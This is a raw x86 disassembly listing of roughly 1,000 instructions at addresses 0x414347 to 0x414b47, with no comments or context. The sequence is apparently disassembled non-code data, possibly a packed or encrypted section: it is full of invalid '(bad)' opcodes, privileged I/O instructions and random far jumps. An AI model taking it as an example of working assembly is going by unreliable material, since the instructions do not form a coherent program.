  414347:	sub    ebx,esi
  414349:	in     al,0xdb
  41434b:	sbb    al,0x7a
  41434d:	out    dx,al
  41434e:	arpl   WORD PTR [ebx+edx*8-0x564ede62],si
  414355:	into   
  414356:	jo     0x4143c8
  414358:	je     0x41434c
  41435a:	stc    
  41435b:	xchg   esi,eax
  41435c:	push   cs
  41435d:	jmp    0x414396
  41435f:	fs pop ebx
  414361:	adc    BYTE PTR [eax+ecx*8],al
  414364:	hlt    
  414365:	fadd   DWORD PTR [edi+esi*8+0x1b]
  414369:	fldenv [esi]
  41436b:	jp     0x4143df
  41436d:	retf   0xc74c
  414370:	pusha  
  414371:	fcom   QWORD PTR [ebp+0x30140f4d]
  414377:	data16 (bad) 
  41437a:	stos   DWORD PTR es:[edi],eax
  41437b:	enter  0x4957,0x8b
  41437f:	add    eax,0xe833df26
  414384:	xchg   BYTE PTR [ebp-0x5f],ch
  414387:	stc    
  414388:	mov    ds:0x39f0c1cb,al
  41438d:	xchg   ebp,eax
  41438e:	pop    ebx
  41438f:	das    
  414390:	pusha  
  414391:	int3   
  414392:	mov    edi,0x4f0ebc3c
  414397:	enter  0xd1f3,0x9
  41439b:	fiadd  WORD PTR [eax+esi*2+0x205a1b38]
  4143a2:	ds pop ebx
  4143a4:	jmp    0x84f1:0x2801d45e
  4143ab:	je     0x4143f1
  4143ad:	xor    dl,al
  4143af:	jo     0x414428
  4143b1:	mov    ?,WORD PTR [eax+0x44]
  4143b4:	jb     0x414391
  4143b6:	inc    ebx
  4143b7:	fld    DWORD PTR [esi+0x14ea08f7]
  4143bd:	jmp    0x7fb3:0x6de1d0c6
  4143c4:	dec    eax
  4143c5:	sbb    ecx,edx
  4143c7:	ins    BYTE PTR es:[edi],dx
  4143c8:	push   cs
  4143c9:	js     0x414436
  4143cb:	es cmc 
  4143cd:	cmp    esi,DWORD PTR [eax-0x4df5ecd0]
  4143d3:	es dec eax
  4143d5:	sbb    ecx,edi
  4143d7:	popf   
  4143d8:	addr16 pop si
  4143db:	stos   BYTE PTR es:[di],al
  4143dd:	adc    bh,cl
  4143df:	loop   0x4143f8
  4143e1:	out    0x69,al
  4143e3:	inc    eax
  4143e4:	xchg   DWORD PTR [eax+0x5],edx
  4143e7:	daa    
  4143e8:	arpl   bx,dx
  4143ea:	push   esp
  4143eb:	cs (bad) 
  4143ed:	sahf   
  4143ee:	fisubr DWORD PTR [esi+0x75d38647]
  4143f4:	ja     0x414423
  4143f6:	dec    edx
  4143f7:	pop    eax
  4143f8:	cmp    bl,BYTE PTR [ebx+0x581c52ed]
  4143fe:	les    esi,FWORD PTR [eax]
  414400:	pop    ss
  414401:	addr16 mov cs:0x2f5a,al
  414406:	mov    edi,0xfccf0292
  41440b:	pop    edi
  41440c:	daa    
  41440d:	ins    BYTE PTR es:[edi],dx
  41440e:	je     0x414390
  414410:	jmp    0x4ad5:0x20ef8f53
  414417:	mov    ds:0xc6d8df8b,eax
  41441c:	or     eax,0xf8ffeedb
  414421:	ror    cl,0x93
  414424:	inc    edx
  414425:	jne    0x41441c
  414427:	call   0xd98:0xde68bb29
  41442e:	xor    eax,0xf6a71e1
  414433:	dec    ebx
  414434:	sbb    bh,BYTE PTR [esi+ebx*8]
  414437:	xor    al,0x12
  414439:	fld    QWORD PTR [ebx]
  41443b:	cwde   
  41443c:	pop    esi
  41443d:	lods   eax,DWORD PTR ds:[esi]
  41443e:	into   
  41443f:	and    esp,esp
  414441:	dec    esp
  414442:	dec    esp
  414443:	dec    ecx
  414444:	pusha  
  414445:	jg     0x41443a
  414447:	pop    ds
  414448:	xchg   ebx,eax
  414449:	das    
  41444a:	daa    
  41444b:	das    
  41444c:	iret   
  41444d:	cmp    al,0xa0
  41444f:	dec    eax
  414450:	imul   ebp,ebp,0x4e83eb
  414456:	aaa    
  414457:	repz es pop ss
  41445a:	xchg   ebp,eax
  41445b:	sbb    BYTE PTR [edx],0xdf
  41445e:	mov    dl,0x71
  414460:	js     0x41446c
  414462:	pop    edi
  414463:	addr16 push esi
  414465:	enter  0xb9d5,0xc2
  414469:	cli    
  41446a:	fcomip st,st(2)
  41446c:	xor    eax,DWORD PTR [ecx]
  41446e:	frstor [ecx]
  414470:	test   al,0x0
  414472:	lds    ebp,FWORD PTR ds:0xf254fd1b
  414478:	jg     0x4144d2
  41447a:	push   0x30
  41447c:	pop    ebp
  41447d:	push   0xffffffad
  41447f:	mov    ebx,0x89f10c32
  414484:	inc    DWORD PTR [edi-0x5e]
  414487:	(bad)  
  414488:	loopne 0x4144b2
  41448a:	adc    ebx,DWORD PTR [ecx-0x2833024b]
  414490:	pop    ecx
  414491:	in     eax,0x28
  414493:	pop    ss
  414494:	and    eax,0x2424da4
  414499:	int    0xbf
  41449b:	cmp    BYTE PTR [ebp+0x67],bl
  41449e:	cmp    DWORD PTR [ecx-0x9081f32],ebx
  4144a4:	mov    ah,0x52
  4144a6:	ja     0x4144ac
  4144a8:	or     esp,DWORD PTR [ecx-0x48]
  4144ab:	(bad)
  4144ae:	and    ebx,DWORD PTR [edi+edx*4]
  4144b1:	push   0x90b60f33
  4144b6:	sbb    eax,0x2ef46339
  4144bb:	ds loope 0x4144c7
  4144be:	cmp    al,0xf2
  4144c0:	jnp    0x4144b0
  4144c2:	dec    ebx
  4144c3:	add    di,WORD PTR [eax+0x1f]
  4144c7:	fucomp st(4)
  4144c9:	push   ebp
  4144ca:	fiadd  WORD PTR [ebx+0x523e0a06]
  4144d0:	mov    esp,0xdec9b6f6
  4144d5:	sub    BYTE PTR [ebp+0x43569039],ch
  4144db:	pop    ss
  4144dc:	xor    eax,edi
  4144de:	adc    esp,esp
  4144e0:	stos   DWORD PTR es:[edi],eax
  4144e1:	adc    eax,0x14c81528
  4144e6:	push   0xe4ed650
  4144eb:	out    dx,eax
  4144ec:	es je  0x4144d2
  4144ef:	push   ecx
  4144f0:	cmp    dl,BYTE PTR [esi]
  4144f2:	imul   ecx,ebp,0x78
  4144f5:	adc    cl,BYTE PTR [eax+0x5]
  4144f8:	jl     0x4144db
  4144fa:	pop    ds
  4144fb:	cmp    DWORD PTR [ebx+0x2b],ecx
  4144fe:	pop    esp
  4144ff:	xor    eax,0x384c6618
  414504:	mov    ebp,DWORD PTR [esi-0x13328e2c]
  41450a:	fs std 
  41450c:	and    edi,DWORD PTR [ebx-0x6b98c260]
  414512:	sbb    ebx,ebp
  414514:	dec    esp
  414515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414516:	test   eax,0xbdc8bb6b
  41451b:	dec    eax
  41451c:	mov    eax,ds:0xae707ac4
  414521:	lahf   
  414522:	sahf   
  414523:	xchg   DWORD PTR [ebp+0x7c74ca69],ecx
  414529:	fsubr  DWORD PTR [edx]
  41452b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41452c:	xchg   ecx,eax
  41452d:	mov    bl,0xf0
  41452f:	stos   BYTE PTR es:[edi],al
  414530:	fldenv [ebp+0x34]
  414533:	and    al,0xa6
  414535:	mov    ecx,0x2325587d
  41453a:	or     DWORD PTR [edx-0x282c935f],0x868b5daa
  414544:	pop    ebx
  414545:	mov    cl,0x13
  414547:	adc    al,0xf5
  414549:	push   0xab022b2d
  41454e:	mov    bl,BYTE PTR [esi]
  414550:	imul   ebx,ecx,0x11e92c1b
  414556:	lods   al,BYTE PTR ds:[esi]
  414557:	jne    0x41459a
  414559:	loop   0x4144ec
  41455b:	lds    esp,FWORD PTR [ebx+ebp*1-0xa]
  41455f:	and    al,0xfc
  414561:	inc    ebx
  414562:	jns    0x41452a
  414564:	mov    dh,0xab
  414566:	add    eax,0xc4cd614b
  41456b:	div    BYTE PTR [edx-0x62]
  41456e:	mov    bl,0x47
  414570:	rcl    DWORD PTR ds:[ebp-0x20],0xfa
  414575:	add    dh,ah
  414577:	fidivr WORD PTR [esi+0x20ec7779]
  41457d:	sbb    ah,BYTE PTR [ebp-0x6f]
  414580:	inc    esp
  414581:	dec    ebx
  414582:	mov    ds:0x85042021,eax
  414587:	std    
  414588:	pop    ss
  414589:	jl     0x41452f
  41458b:	ins    BYTE PTR es:[edi],dx
  41458c:	aas    
  41458d:	pop    ecx
  41458e:	or     BYTE PTR [edi-0x4c],ch
  414591:	jmp    0x414517
  414593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414594:	pop    DWORD PTR [eax]
  414596:	inc    edi
  414597:	push   cs
  414598:	add    bl,BYTE PTR [ebx]
  41459a:	nop
  41459b:	popa   
  41459c:	or     ebp,edx
  41459e:	inc    eax
  41459f:	shl    bh,0x7
  4145a2:	scas   eax,DWORD PTR es:[edi]
  4145a3:	push   ecx
  4145a4:	xchg   edi,eax
  4145a5:	fwait
  4145a6:	test   al,0xae
  4145a8:	adc    bl,BYTE PTR [ecx-0x5]
  4145ab:	imul   esp,DWORD PTR [ebx],0xe6e8a3c7
  4145b1:	and    esi,edx
  4145b3:	inc    ebx
  4145b4:	mov    eax,ds:0x98bd38c5
  4145b9:	ja     0x414594
  4145bb:	stos   DWORD PTR es:[edi],eax
  4145bc:	aas    
  4145bd:	add    al,0x7b
  4145bf:	adc    cl,BYTE PTR [eax+ecx*1-0x565d61a8]
  4145c6:	or     al,0x59
  4145c8:	idiv   DWORD PTR [ecx-0x24]
  4145cb:	xchg   edx,eax
  4145cc:	sbb    bl,al
  4145ce:	mov    al,ds:0x120e135c
  4145d3:	hlt    
  4145d4:	cld    
  4145d5:	add    al,0x48
  4145d7:	inc    ebx
  4145d8:	not    BYTE PTR [ebx-0x1a]
  4145db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145dc:	aad    0x6
  4145de:	jo     0x4145ef
  4145e0:	test   DWORD PTR [ecx+0x66],esi
  4145e3:	and    eax,0x2b9f2c61
  4145e8:	imul   ebx,edx,0xf6d058df
  4145ee:	add    DWORD PTR [edi],esp
  4145f0:	aam    0x39
  4145f2:	xor    esi,edi
  4145f4:	dec    ebx
  4145f5:	mov    ds:0x6cd070f9,al
  4145fa:	arpl   WORD PTR [edi-0x43],cx
  4145fd:	push   cs
  4145fe:	xor    cl,BYTE PTR [edx-0x57f6a403]
  414604:	pop    eax
  414605:	push   ecx
  414606:	ins    DWORD PTR es:[edi],dx
  414607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414608:	mov    BYTE PTR [eax],0x98
  41460b:	aam    0xb8
  41460d:	push   0x81cc8d1f
  414612:	push   ecx
  414613:	mov    esi,0x39eb7d57
  414618:	fisubr DWORD PTR [edi]
  41461a:	mov    edx,0x5e4104b3
  41461f:	ja     0x4145ac
  414621:	push   es
  414622:	daa    
  414623:	sar    BYTE PTR [ebp+0x4dc2a8b8],1
  414629:	inc    esi
  41462a:	add    cl,BYTE PTR [ecx]
  41462c:	test   ch,ch
  41462e:	xor    BYTE PTR [esi-0x75],dh
  414631:	in     al,dx
  414632:	cli    
  414633:	arpl   WORD PTR [edx+0x37689730],ax
  414639:	out    0xf0,al
  41463b:	in     al,dx
  41463c:	push   esi
  41463d:	add    DWORD PTR [ebx+0x0],edx
  414640:	cmp    al,0xc6
  414642:	push   ebp
  414643:	lea    esp,[esi-0x3858458a]
  414649:	and    BYTE PTR [ebx-0x3b48c67e],dh
  41464f:	ss pop es
  414651:	arpl   WORD PTR [edi],si
  414653:	inc    edi
  414654:	fnsave ds:0xf8f944d9
  41465a:	fild   QWORD PTR [ebx+0x483e4d6a]
  414660:	cmp    BYTE PTR [esp+edx*1-0x6989aa69],dh
  414667:	xor    al,0xe6
  414669:	dec    ebp
  41466a:	add    BYTE PTR [ebx+0x7a],dh
  41466d:	stos   BYTE PTR es:[edi],al
  41466e:	dec    esi
  41466f:	xchg   ebx,eax
  414670:	mov    ecx,0xc77c2592
  414675:	inc    esp
  414676:	xchg   DWORD PTR [edi+0x44e3cae4],ebp
  41467c:	call   DWORD PTR [ebx-0x4a]
  41467f:	popa   
  414680:	and    al,0xb2
  414682:	mov    WORD PTR [ebp+0x13],ds
  414685:	int    0xd6
  414687:	ret    
  414688:	inc    ecx
  414689:	mov    BYTE PTR [eax-0x40],dl
  41468c:	sub    dl,ch
  41468e:	iret   
  41468f:	xchg   BYTE PTR [ecx],bl
  414691:	pop    ebp
  414692:	sub    ah,BYTE PTR [ebx-0x2366e07f]
  414698:	dec    ecx
  414699:	ins    BYTE PTR es:[edi],dx
  41469a:	mov    ds:0x65cd0bd4,al
  41469f:	fld    QWORD PTR [ebx*1-0x43b3b117]
  4146a6:	js     0x41464b
  4146a8:	mov    eax,0xfb588d4
  4146ad:	pop    ebp
  4146ae:	aad    0xf8
  4146b0:	out    0x66,al
  4146b2:	scas   al,BYTE PTR es:[edi]
  4146b3:	gs jmp 0xbb1e:0xb2e46c4f
  4146bb:	lods   eax,DWORD PTR ds:[esi]
  4146bc:	mov    dh,BYTE PTR [edi-0x16]
  4146bf:	xlat   BYTE PTR ds:[ebx]
  4146c0:	fisub  WORD PTR [esp+ebx*1-0x7d5fb233]
  4146c7:	push   cs
  4146c8:	loope  0x41470b
  4146ca:	ins    BYTE PTR es:[edi],dx
  4146cb:	mov    cl,0xbc
  4146cd:	push   ds
  4146ce:	call   0x5a5:0x806ee683
  4146d5:	dec    esi
  4146d6:	icebp  
  4146d7:	or     dh,BYTE PTR [ebx+0x53a1ee61]
  4146dd:	nop
  4146de:	push   ebx
  4146df:	mov    eax,0xe553ee53
  4146e4:	or     cl,cl
  4146e6:	mov    ss,edx
  4146e8:	cwde   
  4146e9:	push   es
  4146ea:	sbb    eax,0xec2f9f1d
  4146ef:	test   eax,0xba290984
  4146f4:	jge    0x41470b
  4146f6:	push   0x2e
  4146f8:	hlt    
  4146f9:	mov    al,ds:0x78a48be3
  4146fe:	in     al,0x9b
  414700:	dec    ebp
  414701:	xchg   BYTE PTR [eax+edx*4+0x230c6ea8],dh
  414708:	cwde   
  414709:	fistp  QWORD PTR [ecx]
  41470b:	lods   al,BYTE PTR ds:[esi]
  41470c:	test   BYTE PTR [ebx-0x6841eb9],cl
  414712:	and    DWORD PTR [esi+ecx*4],eax
  414715:	xor    eax,0x2d723ab5
  41471a:	jns    0x4146be
  41471c:	std    
  41471d:	jbe    0x4146be
  41471f:	or     ebx,DWORD PTR [edi+0xf]
  414722:	jo     0x414749
  414724:	or     BYTE PTR [eax+0x52],ah
  414727:	stos   BYTE PTR es:[edi],al
  414728:	lahf   
  414729:	cs out dx,al
  41472b:	je     0x414788
  41472d:	pop    edi
  41472e:	dec    esp
  41472f:	gs inc esp
  414731:	mov    al,0xc6
  414733:	test   BYTE PTR ds:0xb68cd220,bl
  414739:	cmc    
  41473a:	jns    0x41477d
  41473c:	and    dh,bl
  41473e:	or     BYTE PTR [esi+eax*4-0x11d2382d],dh
  414745:	ret    0xe12a
  414748:	iret   
  414749:	xor    al,0x7c
  41474b:	dec    ebx
  41474c:	push   esp
  41474d:	mov    eax,0x11be9d23
  414752:	cmp    dl,BYTE PTR [edi-0x6c]
  414755:	retf   0x54f
  414758:	daa    
  414759:	fst    QWORD PTR [eax+edi*1]
  41475c:	and    bh,BYTE PTR [eax+0x72435dfa]
  414762:	jl     0x41478e
  414764:	loop   0x414787
  414766:	cmp    cl,BYTE PTR [ecx-0xb6f62b0]
  41476c:	mov    eax,DWORD PTR [eax+0x49]
  41476f:	ds xor al,0x29
  414772:	sbb    eax,0x9a377b43
  414777:	test   al,0xf1
  414779:	dec    eax
  41477a:	ret    0x629e
  41477d:	sbb    eax,0xd80c90d6
  414782:	daa    
  414783:	inc    ecx
  414784:	lds    esp,FWORD PTR [eax+0x2c6b675b]
  41478a:	mov    al,0xa3
  41478c:	stos   BYTE PTR es:[edi],al
  41478d:	jp     0x4147b4
  41478f:	test   DWORD PTR [edi+0x42],esp
  414792:	int3   
  414793:	aad    0x86
  414795:	mov    al,ds:0xc913b68f
  41479a:	sar    DWORD PTR [ebp+0x2202edba],cl
  4147a0:	arpl   WORD PTR [ebx],ax
  4147a2:	and    dl,ch
  4147a4:	push   edi
  4147a5:	pusha  
  4147a6:	daa    
  4147a7:	fld    QWORD PTR [edi+0x54223722]
  4147ad:	inc    edx
  4147ae:	push   cs
  4147af:	dec    edx
  4147b0:	imul   ebx,DWORD PTR [ebp-0x269cb604],0x79d260a
  4147ba:	jp     0x4147c3
  4147bc:	mov    dh,0xf2
  4147be:	mov    ds:0xd4fa7678,al
  4147c3:	scas   al,BYTE PTR es:[edi]
  4147c4:	nop
  4147c5:	ins    DWORD PTR es:[edi],dx
  4147c6:	mov    esi,0xd898b2d0
  4147cb:	sbb    al,0xf5
  4147cd:	jno    0x414802
  4147cf:	loopne 0x41477b
  4147d1:	inc    esi
  4147d2:	mov    dl,0x86
  4147d4:	popa   
  4147d5:	es in  eax,0xc4
  4147d8:	sbb    ecx,DWORD PTR [esi+eiz*1+0x60]
  4147dc:	ficom  DWORD PTR [ecx+0x345a9d95]
  4147e2:	ret    
  4147e3:	retf   
  4147e4:	jg     0x414795
  4147e6:	sub    BYTE PTR [edi+esi*1+0x465f8896],0xf7
  4147ee:	rcr    BYTE PTR [ebx+0x8],cl
  4147f1:	xor    dh,cl
  4147f3:	sbb    al,0xd7
  4147f5:	ds dec edi
  4147f7:	js     0x414800
  4147f9:	gs clc 
  4147fb:	loopne 0x4147b3
  4147fd:	loope  0x41487c
  4147ff:	repz jle 0x41484e
  414802:	cmp    cl,ch
  414804:	andnps xmm1,XMMWORD PTR [ecx+0xbb6a8a8]
  41480b:	les    edx,FWORD PTR [bp+si+0x45]
  41480f:	jmp    0x4147cc
  414811:	inc    esi
  414812:	adc    al,0xbc
  414814:	jp     0x4147ad
  414816:	and    ebp,DWORD PTR [edx-0x317dc34f]
  41481c:	cmp    ch,BYTE PTR gs:[esi+0x19]
  414820:	pop    ebx
  414821:	pop    esp
  414822:	pop    es
  414823:	ins    BYTE PTR es:[edi],dx
  414824:	inc    edx
  414825:	test   BYTE PTR [ebp+0x7c],bl
  414828:	(bad)  
  414829:	jmp    0x62bd:0xa193629a
  414830:	dec    esp
  414831:	stc    
  414832:	adc    DWORD PTR [edx],eax
  414834:	inc    esi
  414835:	jae    0x414817
  414837:	cmp    ecx,DWORD PTR [esi-0x73]
  41483a:	and    BYTE PTR [edi+edx*4+0xed1c05e],dh
  414841:	sbb    ch,BYTE PTR [esi+ebx*4+0x77]
  414845:	lds    ecx,FWORD PTR [edi+0x52a59608]
  41484b:	icebp  
  41484c:	(bad)  
  41484d:	cs inc esp
  41484f:	fwait
  414850:	inc    esi
  414851:	pop    esp
  414852:	mov    ah,0xfb
  414854:	cmp    ah,BYTE PTR [edi-0x30132826]
  41485a:	mov    al,0xe9
  41485c:	inc    ecx
  41485d:	std    
  41485e:	lahf   
  41485f:	dec    ebx
  414860:	or     BYTE PTR [edx+0x1feec938],dh
  414866:	push   es
  414867:	ja     0x41488c
  414869:	repz sbb dl,al
  41486c:	adc    dl,BYTE PTR [edx-0x45]
  41486f:	out    0x39,eax
  414871:	xor    esp,DWORD PTR [ecx]
  414873:	clc    
  414874:	pop    ds
  414875:	sbb    al,0x69
  414877:	cld    
  414878:	inc    eax
  414879:	jp     0x414832
  41487b:	xchg   DWORD PTR [ebx+eiz*8-0x10],esi
  41487f:	mov    ds:0xb3ffd485,eax
  414884:	out    0x6b,eax
  414886:	mov    esp,esi
  414888:	push   ss
  414889:	std    
  41488a:	fwait
  41488b:	dec    ebp
  41488c:	lods   eax,DWORD PTR ds:[esi]
  41488d:	dec    ebp
  41488e:	jnp    0x4148ab
  414890:	aam    0xeb
  414892:	and    bl,ah
  414894:	mov    al,0x96
  414896:	retf   0x8e86
  414899:	xor    DWORD PTR [esi-0x5],edx
  41489c:	stos   DWORD PTR es:[edi],eax
  41489d:	mov    al,ds:0x2445f0e4
  4148a2:	mov    cs,WORD PTR [edx+0x60174e00]
  4148a8:	shl    ebx,cl
  4148aa:	xor    ebp,esp
  4148ac:	inc    esp
  4148ad:	hlt    
  4148ae:	sbb    BYTE PTR [ecx],0x34
  4148b1:	aaa    
  4148b2:	inc    bp
  4148b4:	mov    edi,0xe3611fd3
  4148b9:	mov    ecx,0x874d5028
  4148be:	mov    ds:0xd8f68e8c,eax
  4148c3:	ss into 
  4148c5:	lods   eax,DWORD PTR ds:[esi]
  4148c6:	ffreep st(5)
  4148c8:	sub    BYTE PTR [ebp-0x2651df35],ch
  4148ce:	or     DWORD PTR [esi-0x63],esp
  4148d1:	xchg   ecx,esp
  4148d3:	es stos DWORD PTR es:[edi],eax
  4148d5:	shl    DWORD PTR [ebp+0x2807bd6e],0x1d
  4148dc:	repnz pop edx
  4148de:	pop    ss
  4148df:	loop   0x4148c1
  4148e1:	pop    ss
  4148e2:	stos   DWORD PTR es:[edi],eax
  4148e3:	cmove  ebp,DWORD PTR [edx-0x51343c14]
  4148ea:	adc    BYTE PTR [ecx+0x5b589181],ah
  4148f0:	loope  0x414905
  4148f2:	and    eax,0x21a56eaa
  4148f8:	pop    esp
  4148f9:	rcl    BYTE PTR [edx+0x36],0xd
  4148fd:	out    dx,al
  4148fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ff:	sub    eax,0x5ff59fc0
  414904:	adc    ebx,esi
  414906:	cmp    eax,DWORD PTR [edx+0x5d9f140d]
  41490c:	sahf   
  41490d:	push   ebx
  41490e:	jns    0x414922
  414910:	pop    ss
  414911:	fwait
  414912:	push   esp
  414913:	mov    al,cl
  414915:	cmp    bl,BYTE PTR [edi+ebp*8+0x2b]
  414919:	and    cl,BYTE PTR [ebx]
  41491b:	pop    esp
  41491c:	jl     0x414927
  41491e:	popa   
  41491f:	dec    edi
  414920:	shl    eax,1
  414922:	jb     0x41497e
  414924:	xor    DWORD PTR [eax-0x6a],esp
  414927:	or     edx,DWORD PTR [eax-0x76]
  41492a:	mov    eax,ds:0x51d17590
  41492f:	rcr    DWORD PTR [edi-0x3c77ee0e],cl
  414935:	adc    bh,BYTE PTR [eax-0x5]
  414938:	jl     0x414924
  41493a:	xor    al,0xa5
  41493c:	or     esp,eax
  41493e:	push   edx
  41493f:	or     DWORD PTR [ebx+0x7e7dc15],0xffffffb4
  414946:	dec    edi
  414947:	dec    esp
  414948:	inc    edi
  414949:	mov    al,ds:0x78f1cc21
  41494e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41494f:	shl    DWORD PTR [edi+0x632a74d],1
  414955:	and    eax,DWORD PTR ds:0xc237ddd9
  41495b:	or     ch,BYTE PTR ds:0x5b1ac0b3
  414961:	mov    WORD PTR [esi-0xc],gs
  414964:	and    al,BYTE PTR [esi]
  414966:	scas   ax,WORD PTR es:[edi]
  414968:	inc    esp
  414969:	rol    bh,0x33
  41496c:	inc    ebp
  41496d:	and    ah,bh
  41496f:	jl     0x41499e
  414971:	fnstenv [ebx+0x347edb02]
  414977:	ss retf 
  414979:	fxch   st(2)
  41497b:	adc    dh,BYTE PTR [edx+0x8b57f6c]
  414981:	jbe    0x4149f8
  414983:	inc    esp
  414984:	fnsave [ebx-0x53]
  414987:	jp     0x41495e
  414989:	mov    ch,0xb6
  41498b:	add    DWORD PTR [ebx-0x80],0xffffff91
  41498f:	and    ebx,DWORD PTR ds:0x14913908
  414995:	pushf  
  414996:	aad    0xac
  414998:	and    eax,esi
  41499a:	inc    edi
  41499b:	js     0x4149dc
  41499d:	push   0xffffff89
  41499f:	push   ebx
  4149a0:	mov    bh,0xe5
  4149a2:	cmp    ebp,DWORD PTR [esp+edi*2+0x1a8f3d1d]
  4149a9:	imul   edx,DWORD PTR es:[edx+ebp*2+0x7c],0xffffff86
  4149af:	jno    0x41496f
  4149b1:	lahf   
  4149b2:	je     0x41498e
  4149b4:	fsub   QWORD PTR [esi+0x58]
  4149b7:	push   edi
  4149b8:	int    0x12
  4149ba:	cmc    
  4149bb:	(bad)  [edi-0x7f]
  4149be:	inc    ecx
  4149bf:	aad    0xbe
  4149c1:	xor    bl,BYTE PTR [edx+0x69d5e27a]
  4149c7:	into   
  4149c8:	mov    WORD PTR [edx-0x2b],?
  4149cb:	out    dx,eax
  4149cc:	es sub al,0x9a
  4149cf:	out    dx,eax
  4149d0:	sub    bl,BYTE PTR [ebx]
  4149d2:	cmp    BYTE PTR [ecx+0x71],dh
  4149d5:	and    DWORD PTR [eax],ebx
  4149d7:	pop    esi
  4149d8:	sub    DWORD PTR [ebx],edx
  4149da:	push   ebp
  4149db:	or     BYTE PTR [ebx],0x89
  4149de:	mov    esp,0x77b16fa
  4149e3:	add    al,BYTE PTR [edi-0x76aac5b7]
  4149e9:	push   ss
  4149ea:	dec    edi
  4149eb:	into   
  4149ec:	sbb    al,0x41
  4149ee:	xor    BYTE PTR [esi-0x68eed511],0x7b
  4149f5:	or     DWORD PTR [eax+eiz*2-0x26],eax
  4149f9:	mov    cl,0x60
  4149fb:	jo     0x41498c
  4149fd:	dec    ecx
  4149fe:	push   es
  4149ff:	cld    
  414a00:	(bad)  [edx]
  414a02:	and    al,0x97
  414a04:	(bad)  
  414a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a07:	cmp    al,0xa1
  414a09:	mov    ch,0xa3
  414a0b:	call   0x982a4aef
  414a10:	or     cl,BYTE PTR [eax]
  414a12:	add    ebp,ecx
  414a14:	sbb    BYTE PTR ds:0xa65cda21,0x37
  414a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a1c:	outs   dx,DWORD PTR ds:[esi]
  414a1d:	adc    DWORD PTR [edx+ebp*1+0x20e27933],esi
  414a24:	and    esp,DWORD PTR [esi-0x80]
  414a27:	retf   
  414a28:	cmp    BYTE PTR [edi+0x3b420e34],0xba
  414a2f:	mov    ah,0xec
  414a31:	fisttp DWORD PTR [eax-0x3e23d427]
  414a37:	or     al,0x5d
  414a39:	aam    0x80
  414a3b:	push   0x42
  414a3d:	cmp    ebp,DWORD PTR [ebx+0x6fbafd1]
  414a43:	cdq    
  414a44:	es xor eax,0x8ff9c5cd
  414a4a:	dec    ebp
  414a4b:	nop
  414a4c:	mov    ds:0x4b1a8133,al
  414a51:	sub    esi,esp
  414a53:	in     al,dx
  414a54:	mov    dh,0xd3
  414a56:	in     eax,0x74
  414a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a59:	xchg   edi,eax
  414a5a:	loopne 0x414aa3
  414a5c:	cmp    BYTE PTR [ebx],dh
  414a5e:	ins    BYTE PTR es:[edi],dx
  414a5f:	or     ch,0xb2
  414a62:	pop    es
  414a63:	int    0xef
  414a65:	pop    ds
  414a66:	jge    0xe81a65
  414a6c:	sub    bl,BYTE PTR ds:0x1505c48
  414a72:	mov    ss,WORD PTR [ebx+0x677640c8]
  414a78:	inc    ebp
  414a79:	xchg   ecx,eax
  414a7a:	in     al,0xc8
  414a7c:	nop
  414a7d:	or     al,BYTE PTR [ebp-0x4ad4b79a]
  414a83:	mov    esp,eax
  414a85:	out    0xf9,eax
  414a87:	cmp    ebx,DWORD PTR [edx]
  414a89:	jg     0x414ac6
  414a8b:	or     esi,DWORD PTR [ebp+esi*4+0x2f78d792]
  414a92:	lds    ebp,FWORD PTR [edi+0x1f22948f]
  414a98:	push   ebp
  414a99:	(bad)  
  414a9a:	int    0xe4
  414a9c:	ror    DWORD PTR ds:0xcbd56aa9,0xa0
  414aa3:	in     eax,dx
  414aa4:	fdivr  DWORD PTR [esi-0x26c239d]
  414aaa:	sbb    DWORD PTR [eax-0x297e217d],esp
  414ab0:	xor    BYTE PTR [ebp-0x4ea86855],0x11
  414ab7:	fwait
  414ab8:	jp     0x414a7b
  414aba:	pop    edx
  414abb:	sbb    al,0xc1
  414abd:	mov    al,0xeb
  414abf:	jns    0x414aee
  414ac1:	sti    
  414ac2:	push   ebx
  414ac3:	repz xor DWORD PTR [esi],eax
  414ac6:	test   BYTE PTR [edi+0x36],bh
  414ac9:	repz ret 
  414acb:	out    0x92,eax
  414acd:	jne    0x414af1
  414acf:	retf   0x5fb9
  414ad2:	gs mov ebp,DWORD PTR gs:[esi+0x18]
  414ad7:	add    al,dl
  414ad9:	and    DWORD PTR [ebx-0xd],esi
  414adc:	xchg   esi,eax
  414add:	mov    ds:0xcea09fa5,al
  414ae2:	std    
  414ae3:	fdiv   st(6),st
  414ae6:	stos   DWORD PTR es:[edi],eax
  414ae7:	cld    
  414ae8:	and    DWORD PTR [edi-0x6963ca22],eax
  414aee:	rcl    bh,0x2c
  414af1:	add    eax,0x65e2aac9
  414af6:	adc    DWORD PTR [edi],esi
  414af8:	into   
  414af9:	mov    al,ds:0x595a653c
  414afe:	and    eax,0xebd6e959
  414b03:	dec    edi
  414b04:	(bad)  
  414b05:	(bad)  
  414b06:	fcmove st,st(7)
  414b08:	imul   eax,DWORD PTR [esi+0x662ff4d],0x1e20f89d
  414b12:	shl    DWORD PTR [edi+0x5c112eeb],0x80
  414b19:	inc    esp
  414b1a:	lods   eax,DWORD PTR ds:[esi]
  414b1b:	push   0x54
  414b1d:	(bad)  
  414b1e:	push   ss
  414b1f:	xchg   DWORD PTR [bp+si+0x76],ecx
  414b23:	or     al,0xfd
  414b25:	mov    cl,0x46
  414b27:	fsub   DWORD PTR [ecx+0x69]
  414b2a:	push   cs
  414b2b:	or     DWORD PTR [ebx+0x57026442],edi
  414b31:	or     esp,edx
  414b33:	xchg   edi,eax
  414b34:	iret   
  414b35:	mov    ch,0xc3
  414b37:	jecxz  0x414ae3
  414b39:	and    dl,BYTE PTR [eax-0x344a771d]
  414b3f:	lahf   
  414b40:	mov    al,0x70
  414b42:	out    0x6b,al
  414b44:	push   edi
  414b45:	out    0x9e,al
  414b47:	mov    ?,eax
